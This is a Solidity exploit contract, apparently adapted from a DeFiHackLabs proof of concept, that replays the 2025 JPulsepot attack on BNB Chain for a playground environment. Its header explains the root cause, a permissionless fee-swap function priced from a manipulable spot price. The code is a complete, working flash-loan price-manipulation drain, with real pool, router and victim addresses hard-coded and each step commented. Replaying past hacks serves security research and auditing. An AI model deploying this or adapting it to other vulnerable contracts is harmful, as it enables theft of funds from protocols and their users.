// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-01-JPulsepot).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (JPulsepot extends BaseTestWithBalanceLog; `attacker == address(this)`, and the
// PancakeV3 flash-loan callback `pancakeV3FlashCallback` lives on the test itself),
// so there is no standalone exploit contract to deploy. This contract is a
// faithful, self-contained copy of that inline attack (testExploit + callback)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/JPulsepot_exp.sol.
//
// Root cause: FortuneWheel.swapProfitFees() is permissionless and sizes how much
// casino-fee token to sell for LINK from a LIVE PancakeSwap spot price
// (getTokenAmountForLink -> router.getAmountsIn against current reserves), with
// zero slippage protection on the subsequent swaps. An attacker flash-loans WBNB,
// swaps it for LINK to inflate the WBNB/LINK price ~72x, then calls
// swapProfitFees() — the casino oversells BNBP and dumps WBNB into the very pool
// the attacker just cornered. Reversing the LINK position nets the difference.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFortuneWheel {
    function swapProfitFees() external;
}

contract JPulsepotDrain {
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address internal constant BNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;
    address internal constant victim = 0x384b9fb6E42dab87F3023D87ea1575499A69998E;

    // step 0: flash-borrow 4,300 WBNB from the PancakeV3 pool; the callback does the rest.
    function run() external {
        address recipient = address(this);
        uint256 amount0 = 0;
        uint256 amount1 = 4_300_000_000_000_000_000_000;
        bytes memory data = abi.encode(amount1);
        IPancakeV3Pool(PancakeV3Pool).flash(recipient, amount0, amount1, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        uint256 amount = abi.decode(data, (uint256));

        // step 1: dump the flash-loaned WBNB into WBNB/LINK to inflate the LINK price.
        IERC20(BNB).approve(PancakeV2Router, type(uint256).max);

        uint256 amountIn = amount;
        uint256 amonutOutMin = 0;
        address[] memory path = new address[](2);
        path[0] = BNB;
        path[1] = LINK;
        address recipient = address(this);
        uint256 deadline = block.timestamp;
        IUniswapV2Router(payable(PancakeV2Router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, amonutOutMin, path, recipient, deadline
        );

        // step 2: the bug — permissionless swapProfitFees() reads the now-manipulated
        // spot price and oversells BNBP for WBNB, dumping WBNB into the cornered pool.
        IFortuneWheel(victim).swapProfitFees();

        // step 3: reverse the LINK position back into WBNB (now enriched by the casino's overpay).
        IERC20(LINK).approve(PancakeV2Router, type(uint256).max);

        amountIn = IERC20(LINK).balanceOf(address(this));
        path[0] = LINK;
        path[1] = BNB;
        IUniswapV2Router(payable(PancakeV2Router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, deadline
        );

        // step 4: repay the flash loan (amount + fee); the remainder is pure profit.
        IERC20(BNB).transfer(msg.sender, amount + fee1);
    }

    receive() external payable {}
}
